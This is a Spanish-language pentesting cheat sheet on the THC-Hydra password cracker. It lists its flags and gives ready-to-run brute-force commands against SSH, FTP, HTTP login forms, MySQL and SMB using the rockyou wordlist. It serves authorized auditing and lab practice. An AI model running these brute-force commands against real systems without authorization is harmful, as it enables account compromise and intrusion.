
---
Hydra (THC-Hydra) es un _parallelized network logon cracker_: una herramienta rápida y flexible para probar credenciales contra muchos protocolos (SSH, FTP, HTTP-FORM, RDP, SMB, SMTP, etc.). Se usa en tests de penetración y auditorías de contraseñas — **siempre** usar con autorización y para fines legales/éticos. [Kali Linux+1](https://www.kali.org/tools/hydra/)

###### Generalmente para usar hydra necesitamos al menos saber un usuario o una contraseña para realizar los ataques de fuerza bruta, al menos uno de los dos para que sea eficaz el ataque


```bash
# Se usa mayuscula si no conozco el dato como -L , -P y minuscula si lo conzco -l , -p

hydra -l juan -P /usr/share/wordlist/rockyou.txt ssh://<IpVictima>   # Ataque a ssh, Fuerza burta a contraseña
hydra -L /usr/share/wordlist/metaesploit/unix_users.txt -p qwerty ftp://<IpVictima> # Ataque a ftp, Fuerza Bruta Usuario
```

[[Rockyou - Contraseñas]] -> Diccionario de Contraseñas
[[Unix_users  - Usuarios]] -> Diccionario de Usuarios

---
#### Para hacer fuerza bruta hacia paneles Login

```bash
hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.60 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password."
```
```bash
/my_weblog/admin.php # Indica la ruta donde se aloja la peticion la cual puede ser encontrada con burpsuite 
username=admin&password=^PASS^ # Indica las variables que se tienen y las que quieres aplicar fuerza bruta 
Incorrect username or password. # El mensaje de error que aparece una vez se trate de realizar fuerza bruta al panel de login
```

---
#### Fuerza bruta hacia bases de datos MySql

- Las bases de datos sql normalmente corren por el puerto 3306, si vemos uno de de estos abierto con nmap podemos intentar la fuerza bruta de contraseñas

```bash
hydra -l capybara -P /usr/share/wordlist/rockyou.txt mysql://172.17.0.2 # 
```

---
#### Fuerza bruta protocolo smb
- Podemos también ver el recurso de [[p445 - SMB - Server Message Block]]

```bash
hydra -l <Usuario> -P /usr/share/wordlist/rockyou.txt smb://192.168.1.22 # Fuerza bruta al protocolo smb
```
---
### Comandos Comunes 

# Instalación rápida

En distribuciones Debian/Ubuntu/Kali:

`sudo apt update sudo apt install hydra`

(En Kali está empaquetado y documentado; versión y dependencias en la página de la distro). [Kali Linux](https://www.kali.org/tools/hydra/)

# Sintaxis básica

`hydra [opciones] [servicio://]target[:puerto][/OPCIONES_SERVICIO]`

Ejemplo simple (SSH):

`hydra -l root -P /ruta/wordlist.txt -t 6 ssh://192.168.1.123`

Esto intenta loguear como `root` usando la lista `wordlist.txt` con 6 hilos contra el servicio SSH del host. [Kali Linux](https://www.kali.org/tools/hydra/)

# Flags / comandos más comunes (y qué hacen)

- `-l LOGIN` → probar un único usuario.
    
- `-L archivo` → probar múltiples usuarios desde archivo.
    
- `-p PASS` → probar una única contraseña.
    
- `-P archivo` → probar múltiples contraseñas desde archivo (wordlist).
    
- `-t N` → número de conexiones paralelas por objetivo (threads).
    
- `-T N` → conexiones paralelas globales (cuando se usan muchos hosts con `-M`).
    
- `-s PUERTO` → especificar puerto si no es el por defecto.
    
- `-S` → forzar SSL/TLS (ej. `https` o servicios SSL).
    
- `-x MIN:MAX:CHARSET` → generar contraseñas por fuerza bruta (autogeneradas).
    
- `-e nsr` → probar opciones extra: `n` (null), `s` (login como pass), `r` (login invertido).
    
- `-f` / `-F` → salir cuando se encuentre una credencial (`-F` global).
    
- `-o archivo` → escribir credenciales encontradas a archivo; `-b FORMAT` para formato (text/json).
    
- `-R` → restaurar sesión anterior.
    
- `-v` / `-V` → modo verbose (ver intentos).
    
- `-U` → mostrar ayuda específica del módulo/servicio.  
    (Estos flags y sus descripciones aparecen en la ayuda oficial). [Kali Linux](https://www.kali.org/tools/hydra/)
    

# Ejemplos prácticos

1. **SSH (usuario known, lista de contraseñas)**
    

`hydra -l administrador -P /usr/share/wordlists/rockyou.txt -t 8 ssh://10.0.0.5`

2. **FTP (lista de usuarios y lista de contraseñas)**
    

`hydra -L users.txt -P passlist.txt -t 10 ftp://ftp.example.com`

3. **HTTP (formulario POST)** — sintaxis típica para formularios (ejemplo genérico):
    

`hydra -L users.txt -P passlist.txt example.com http-form-post "/login.php:username=^USER^&password=^PASS^:F=Invalid"`

Aquí `^USER^` y `^PASS^` son reemplazados por hydra; la parte después de `:` indica la cadena que marca fallo (`F=Invalid`). Revisar el módulo `http-form-post` para ajustar campos y respuestas. [Kali Linux+1](https://www.kali.org/tools/hydra/)

4. **Usando múltiples hosts (-M)**  
    Preparar un archivo `hosts.txt` con una IP/host por línea y ejecutar:
    

`hydra -L users.txt -P passlist.txt -M hosts.txt -t 4 ftp`